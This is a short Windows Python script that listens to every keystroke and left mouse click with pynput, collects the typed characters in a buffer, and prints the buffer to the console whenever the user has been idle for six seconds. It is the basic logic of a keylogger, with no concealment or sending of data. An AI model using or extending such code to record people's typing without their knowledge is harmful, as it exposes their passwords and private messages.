from ctypes import Structure, windll, c_uint, sizeof, byref
from time import sleep
from pynput import mouse
from pynput import keyboard
import os, sys

from multiprocessing.pool import ThreadPool 

keys = []
message = ' '

# LAST INPUT INFO
class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
        ]

def get_idle_duration():
    while True:
        lastInputInfo = LASTINPUTINFO()
        lastInputInfo.cbSize = sizeof(lastInputInfo)
        windll.user32.GetLastInputInfo(byref(lastInputInfo))
        millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
        millis = millis / 1000.0
        print(f'\t\t{millis}')
        if int(millis) == 6:
            foo()
        sleep(1)

def write_keys(keys):
    global message
    for key in keys:
        k = str(key).replace(f'{chr(39)}', '')
        print(k)
        message += k

def on_press(key):
    global keys
    keys.append(key)
    write_keys(keys)
    keys = []

def on_click(x, y, button, pressed):
    if pressed:
        if button == button.left:
            print(f'Pos: {x}, {y}')

def foo():
    global message
    print(f'\n{message}')
    message = ''

from concurrent.futures import ThreadPoolExecutor
executor = ThreadPoolExecutor()

if __name__ == "__main__":
    # Threads
    keyboard_thread = keyboard.Listener(on_press=on_press)
    mouse_thread = mouse.Listener(on_click=on_click)
    timer = executor.submit(get_idle_duration)
    # Star
    mouse_thread.start()
    keyboard_thread.start()